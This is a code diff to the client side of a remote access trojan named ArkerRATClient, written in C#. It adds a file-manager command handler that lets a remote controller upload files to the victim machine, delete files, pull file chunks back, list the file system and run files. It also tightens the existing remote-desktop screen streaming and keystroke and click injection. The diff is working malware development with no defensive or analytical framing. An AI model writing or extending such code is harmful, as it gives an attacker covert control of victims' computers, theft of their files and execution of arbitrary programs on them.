@@ -111,6 +111,8 @@ namespace ArkerRATClient
                         await Task.Run(() => SortData("§PingStart§", "§PingEnd§"));
                         await Task.Run(() => SortData("§RemoteDesktopStart§", "§RemoteDesktopEnd§"));
                         await Task.Run(() => SortData("§ReconnectStart§", "§ReconnectEnd§"));
+                        await Task.Run(() => SortData("§FileManagerStart§", "§FileManagerEnd§"));
+
 
 
 
@@ -153,7 +155,7 @@ namespace ArkerRATClient
                         }
                         else if (startDelimiter == "§RemoteDesktopStart§")
                         {
-                            if(subString.Length == 0)
+                            if(subString.Length == 0&&!RemoteDesktop.sendingFrames)
                             {      
                                    RemoteDesktop.sendingFrames= true;
                                    Task.Run(()=> RemoteDesktop.StartScreenStreaming(9));
@@ -163,12 +165,59 @@ namespace ArkerRATClient
                             {
                               RemoteDesktop.EmulateKeyStrokes(subString.Replace("§KI§", string.Empty));
                             }
-                            else if (subString.Contains("close"))
+                            else if (subString.Contains("close")&&RemoteDesktop.sendingFrames)
                             {
-                                RemoteDesktop.sendingFrames = !RemoteDesktop.sendingFrames;
+                                RemoteDesktop.sendingFrames = false;
                             }
                             else if (subString.Contains("§ClickPositionStart§"))
                                 RemoteDesktop.EmulateClick(subString);
+                        }
+                        else if(startDelimiter == "§FileManagerStart§")
+                        {
+                            if (subString.Contains("§UF§"))
+                            {
+                                subString = subString.Replace("§UF§", string.Empty);
+
+                                if(subString.Contains("§start§")&&!FileManager.download)
+                                {
+                                    subString = subString.Replace("§start§", string.Empty);
+                                    Task.Run(()=> FileManager.StartDownloadingFile(subString));
+                                }
+                                else if (subString =="§end§")
+                                {
+                                    FileManager.download = false;
+                                    FileManager.dataBuffer = new System.Collections.Concurrent.ConcurrentQueue<string>();
+                                }
+                                else
+                                {
+                                    FileManager.dataBuffer.Enqueue(subString);
+                                }
+                            }
+                            else if (subString.Contains("§delete§"))
+                            {
+                                subString = subString.Replace("§delete§", string.Empty);
+                                FileManager.DeleteObject(subString);
+                            }
+                            else if (subString.Contains("§DF§"))
+                            {
+                                subString = subString.Replace("§DF§", string.Empty);
+                                FileManager.SendFileChunks(subString);
+                            }
+                            else if (subString.Contains("§exe§"))
+                            {
+                                subString = subString.Replace("§exe§", string.Empty);
+                                FileManager.ExecuteFile(subString);
+
+                            }
+                            else if (subString =="close")
+                            {
+                                FileManager.CloseFileManager();
+                            }
+                            else
+                            {
+
+                                FileManager.SendFileSystem(subString);
+                            }
                         }
                         else if (startDelimiter == "§PingStart§")
                         {
